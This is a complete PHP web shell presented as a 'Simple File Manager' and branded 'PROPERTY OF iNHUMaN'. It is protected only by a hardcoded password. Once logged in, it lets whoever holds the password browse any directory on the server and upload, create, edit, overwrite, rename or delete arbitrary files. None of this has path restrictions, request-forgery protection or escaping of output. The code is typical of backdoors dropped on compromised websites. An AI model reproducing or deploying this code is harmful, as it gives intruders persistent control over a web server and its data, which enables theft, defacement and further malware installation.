<?php
session_start();

// Cek apakah sudah login
if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    // Jika sudah login, lanjutkan ke file manager
    $currentDir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;

    // Periksa apakah direktori dapat dibaca
    if (!is_dir($currentDir) || !is_readable($currentDir)) {
        echo "Error: Unable to read directory.";
        exit;
    }

    $dirs = scandir($currentDir);
    $folders = [];
    $files = [];

    foreach ($dirs as $dir) {
        if ($dir === '.' || $dir === '..') continue;
        $fullPath = $currentDir . DIRECTORY_SEPARATOR . $dir;
        if (is_dir($fullPath)) {
            $folders[] = $dir;
        } else {
            $files[] = $dir;
        }
    }

    function getPermissions($path) {
        if (file_exists($path) && is_readable($path)) {
            return substr(sprintf('%o', fileperms($path)), -4);
        } else {
            return "N/A";
        }
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple File Manager</title>
    <link href="https://fonts.googleapis.com/css?family=Montserrat&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            font-family: 'Montserrat', sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            padding: 0;
        }

        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: #483D8B;
            padding: 10px;
            color: white;
        }

        .navbar a {
            color: white;
            text-decoration: none;
            padding: 10px 20px;
            border-radius: 5px;
            margin: 0 5px;
        }

        .navbar a:hover {
            background-color: #fff;
            color: #483D8B;
        }

        .container {
            padding: 20px;
        }

        h2 {
            text-align: center;
            color: #483D8B;
        }

        .breadcrumb {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            overflow-x: auto;
        }

        .breadcrumb a {
            color: #483D8B;
            text-decoration: none;
            margin-right: 5px;
            white-space: nowrap;
        }

        .breadcrumb span {
            margin-right: 5px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            overflow-x: auto;
        }

        th, td {
            padding: 12px;
            border: 1px solid #ddd;
            text-align: left;
            white-space: nowrap;
        }

        th {
            background-color: #f2f2f2;
        }

        .writable {
            color: green;
        }

        .not-writable {
            color: red;
        }

        .form-container {
            max-width: 600px;
            margin: auto;
            padding: 20px;
            border: 1px solid #ddd;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            margin-bottom: 20px;
        }

        .form-container h3 {
            margin-top: 0;
        }

        .form-container input[type="text"],
        .form-container input[type="file"],
        .form-container textarea {
            width: 100%;
            padding: 10px;
            margin: 5px 0 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }

        .form-container button {
            background-color: #483D8B;
            color: white;
            padding: 10px 20px;
            border: 1px solid #483D8B;
            border-radius: 5px;
            cursor: pointer;
        }

        .form-container button:hover {
            background-color: #fff;
            color: #483D8B;
        }

        .hidden-form {
            display: none;
        }

        @media only screen and (max-width: 768px) {
            .container {
                padding: 10px;
            }
            .breadcrumb {
                overflow-x: scroll;
            }
            table {
                font-size: 14px;
                white-space: nowrap;
            }
            table thead {
                display: none;
            }
            table tbody {
                display: block;
                overflow-x: auto;
            }
            table tr {
                display: flex;
                flex-wrap: wrap;
                justify-content: space-between;
                margin-bottom: 10px;
                border: 1px solid #ddd;
                border-radius: 5px;
            }
            table th {
            	background-color: #483D8B;
            }
            table td {
                width: 100%;
                padding: 8px;
                border: none;
                border-bottom: 1px solid #ddd;
                white-space: nowrap;
            }
            table td:first-child {
                flex: 1;
                padding-left: 20px;
            }
            table td:nth-child(2),
            table td:nth-child(3),
            table td:nth-child(4) {
                flex-basis: calc(25% - 20px);
                text-align: center;
            }
            table td:last-child {
                flex-basis: calc(25% - 20px);
                padding-right: 20px;
                text-align: right;
            }
        }
    </style>
</head>
<body>
    <div class="navbar">
        <a href="#" onclick="toggleForm('create-folder-form')"><i class="fas fa-folder-plus"></i> Create Folder</a>
        <a href="#" onclick="toggleForm('upload-file-form')"><i class="fas fa-upload"></i> Upload File</a>
        <a href="#" onclick="toggleForm('create-file-form')"><i class="fas fa-file-alt"></i> Create File</a>
    </div>

    <div class="container">
        <h2>PROPERTY OF <b>iNHUMaN</b></h2>

        <form id="create-folder-form" class="hidden-form form-container" action="" method="post">
            <h3>Create Folder</h3>
            <input type="text" name="folder_name" placeholder="Folder Name" required>
            <button type="submit" name="add_folder"><i class="fas fa-plus"></i> Add Folder</button>
        </form>

        <form id="upload-file-form" class="hidden-form form-container" action="" method="post" enctype="multipart/form-data">
            <h3>Upload File</h3>
            <input type="file" name="file" required>
            <button type="submit" name="add_file"><i class="fas fa-upload"></i> Add File</button>
        </form>

        <form id="create-file-form" class="hidden-form form-container" action="" method="post">
            <h3>Create File</h3>
            <input type="text" name="file_name" placeholder="File Name" required>
            <button type="submit" name="create_file"><i class="fas fa-file-alt"></i> Create File</button>
        </form>

        <div class="breadcrumb">
            <span>Directory:</span>
            <?php 
            $path_parts = explode(DIRECTORY_SEPARATOR, $currentDir);
            $path_display = "";
            foreach ($path_parts as $index => $path_part) {
                if ($index > 0) {
                    echo "/";
                }
                $path_display .= $path_part;
                echo "<a href='?dir=" . urlencode($path_display) . "'>$path_part</a>";
                $path_display .= DIRECTORY_SEPARATOR;
            }
            ?>
        </div>

        <table>
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Type</th>
                    <th>Permission</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($folders as $folder): ?>
                    <?php $fullPath = $currentDir . DIRECTORY_SEPARATOR . $folder; ?>
                    <tr>
                        <td data-label="Name"><a href="?dir=<?php echo urlencode($fullPath); ?>"><i class="fas fa-folder"></i> <?php echo $folder; ?></a></td>
                        <td data-label="Type">Folder</td>
                        <td data-label="Permission" class="<?php echo is_writable($fullPath) ? 'writable' : 'not-writable'; ?>">
                            <?php echo getPermissions($fullPath); ?>
                        </td>
                        <td data-label="Action">
                            <a href="?delete=<?php echo urlencode($fullPath); ?>" onclick="return confirm('Are you sure you want to delete this folder?')"><i class="fas fa-trash-alt"></i> Delete</a> | 
                            <a href="?rename=<?php echo urlencode($fullPath); ?>"><i class="fas fa-edit"></i> Rename</a>
                        </td>
                    </tr>
                <?php endforeach; ?>
                <?php foreach ($files as $file): ?>
                    <?php $fullPath = $currentDir . DIRECTORY_SEPARATOR . $file; ?>
                    <tr>
                        <td data-label="Name"><i class="fas fa-file"></i> <?php echo $file; ?></td>
                        <td data-label="Type">File</td>
                        <td data-label="Permission" class="<?php echo is_writable($fullPath) ? 'writable' : 'not-writable'; ?>">
                            <?php echo getPermissions($fullPath); ?>
                        </td>
                        <td data-label="Action">
                            <a href="?edit=<?php echo urlencode($fullPath); ?>"><i class="fas fa-edit"></i> Edit</a> | 
                            <a href="?delete=<?php echo urlencode($fullPath); ?>" onclick="return confirm('Are you sure you want to delete this file?')"><i class="fas fa-trash-alt"></i> Delete</a> | 
                            <a href="?rename=<?php echo urlencode($fullPath); ?>"><i class="fas fa-edit"></i> Rename</a>
                        </td>
                    </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>

    <script>
        function toggleForm(formId) {
            var forms = document.querySelectorAll('.hidden-form');
            forms.forEach(function(form) {
                if (form.id === formId) {
                    form.style.display = form.style.display === 'none' || form.style.display === '' ? 'block' : 'none';
                } else {
                    form.style.display = 'none';
                }
            });
        }
    </script>

    <?php
    if (isset($_POST['add_folder'])) {
        $folderName = $_POST['folder_name'];
        mkdir($currentDir . DIRECTORY_SEPARATOR . $folderName);
        header("Location: {$_SERVER['PHP_SELF']}?dir=" . urlencode($currentDir));
        exit;
    }

    if (isset($_POST['add_file'])) {
        $file = $_FILES['file'];
        move_uploaded_file($file['tmp_name'], $currentDir . DIRECTORY_SEPARATOR . $file['name']);
        header("Location: {$_SERVER['PHP_SELF']}?dir=" . urlencode($currentDir));
        exit;
    }

    if (isset($_POST['create_file'])) {
        $fileName = $_POST['file_name'];
        $filePath = $currentDir . DIRECTORY_SEPARATOR . $fileName;
        if (!file_exists($filePath)) {
            fopen($filePath, "w");
            header("Location: {$_SERVER['PHP_SELF']}?dir=" . urlencode($currentDir));
            exit;
        } else {
            echo "File already exists.";
        }
    }

    if (isset($_GET['edit'])) {
        $fileToEdit = urldecode($_GET['edit']);
        if (file_exists($fileToEdit)) {
            $fileContent = file_get_contents($fileToEdit);
            ?>

            <div class="form-container">
                <h3>Edit File: </h3>
                <form action="" method="post">
                    <textarea name="file_content" rows="10" cols="50" style="width: 100%;"><?php echo htmlentities($fileContent); ?></textarea><br>
                    <input type="hidden" name="file_to_edit" value="<?php echo $fileToEdit; ?>">
                    <button type="submit" name="save_file"><i class="fas fa-save"></i> Save Changes</button>
                </form>
            </div>

            <?php
        }
    }

    if (isset($_POST['save_file'])) {
        $fileToEdit = $_POST['file_to_edit'];
        $fileContent = $_POST['file_content'];
        file_put_contents($fileToEdit, $fileContent);
        header("Location: {$_SERVER['PHP_SELF']}?dir=" . urlencode($currentDir));
        exit;
    }

    if (isset($_GET['delete'])) {
        $fileToDelete = urldecode($_GET['delete']);
        if (is_dir($fileToDelete)) {
            rmdir($fileToDelete);
        } else {
            unlink($fileToDelete);
        }
        header("Location: {$_SERVER['PHP_SELF']}?dir=" . urlencode($currentDir));
        exit;
    }

    if (isset($_GET['rename'])) {
        $fileToRename = urldecode($_GET['rename']);
        ?>

        <div class="form-container">
            <h3>Rename: </h3>
            <form action="" method="post">
                <input type="text" name="new_name" placeholder="New Name" required style="width: 100%;">
                <input type="hidden" name="file_to_rename" value="<?php echo $fileToRename; ?>">
                <button type="submit" name="rename_file"><i class="fas fa-edit"></i> Rename</button>
            </form>
        </div>

        <?php
    }

    if (isset($_POST['rename_file'])) {
        $fileToRename = $_POST['file_to_rename'];
        $newName = $_POST['new_name'];
        $newPath = dirname($fileToRename) . DIRECTORY_SEPARATOR . $newName;
        rename($fileToRename, $newPath);
        header("Location: {$_SERVER['PHP_SELF']}?dir=" . urlencode($currentDir));
        exit;
    }
    ?>
</body>
</html>
<?php
} else {
    // Jika belum login, tampilkan form login
    if (isset($_POST['password'])) {
        // Password yang benar
        $password = 'jawa'; // Ganti dengan password yang diinginkan

        if ($_POST['password'] == $password) {
            $_SESSION['loggedin'] = true;
            echo '<script type="text/javascript">
            window.location = "' . $_SERVER['PHP_SELF'] . '"
            </script>';
        } else {
            echo 'Password salah!';
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Login</title>
        <link href="https://fonts.googleapis.com/css?family=Montserrat&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
        <style>
            body {
                font-family: 'Montserrat', sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                background-color: #f4f4f9;
                margin: 0;
                padding: 0;
            }

            .login-container {
                max-width: 400px;
                width: 100%;
                padding: 20px;
                border: 1px solid #ddd;
                background-color: #fff;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                border-radius: 10px;
                text-align: center;
            }

            .login-container h3 {
                margin-bottom: 20px;
                color: #483D8B;
            }

            .login-container input[type="password"] {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border: 1px solid #ccc;
                border-radius: 5px;
                box-sizing: border-box;
            }

            .login-container button {
                background-color: #483D8B;
                color: white;
                padding: 10px 20px;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                width: 100%;
            }

            .login-container button:hover {
                background-color: #fff;
                color: #483D8B;
                border: 1px solid #483D8B;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h3>Login</h3>
            <form method="POST">
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit"><i class="fas fa-sign-in-alt"></i> Login</button>
            </form>
        </div>
    </body>
    </html>
<?php
}
?>
